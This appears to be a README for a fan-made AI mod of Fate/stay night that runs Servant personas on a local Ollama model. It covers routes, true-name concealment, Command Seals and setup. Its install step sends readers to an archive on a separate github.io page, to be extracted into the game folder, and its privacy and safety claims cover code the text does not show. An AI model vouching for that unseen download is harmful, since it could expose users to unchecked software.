## About

**Fate/stay night — AI Edition** runs the Fifth Holy Grail War as a conversation. Saber, Rin, Sakura, Archer, Rider and the rest are each given their own locally-hosted persona, complete with class, Noble Phantasm and the parts of their identity they refuse to disclose.

The mod respects the three routes: pick Fate, Unlimited Blade Works or Heaven's Feel and the cast's loyalties, secrets and available knowledge change with it.

> ⚔️ True names are hidden by default. A Servant will dodge, deflect and lie about their identity until you give them a reason not to.

---

## ✨ Features

- 🗡️ **Route selector** — Fate / UBW / Heaven's Feel each reconfigure who knows what.
- 🎭 **True name concealment** — Servants guard their identity as a hard prompt constraint.
- 📜 **Command Seal system** — Three seals, tracked. Spend one and the Servant must comply.
- 👥 **Master–Servant pairs** — Relationships are modelled, not just individual personalities.
- 🔒 **Local and offline** — No cloud, no API keys, no subscription.
- 🖼️ **Sprite-mood sync** — Expression selection across the full Réalta Nua sheet.

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Fate/stay night

1. Start from a clean, working installation of **Fate/stay night**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

## 🎯 Waging the War

1. Command Seals are limited on purpose. The mod tracks them across the session.
2. Ask a Servant about their legend obliquely — direct questions trigger the concealment rule.
3. Heaven's Feel route flags contain heavy spoilers; leave them off on a first read.

## ❓ FAQ

**Q: Does it cover Réalta Nua or the original release?**
> Both PC layouts are supported; the mod reads sprites from your installed copy.

**Q: Are Fate/Grand Order servants included?**
> No. The roster is limited to the Fifth Grail War cast.

**Q: Can I be the Master?**
> Yes — that's the default framing. Shirou can also be run as an AI persona instead.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.
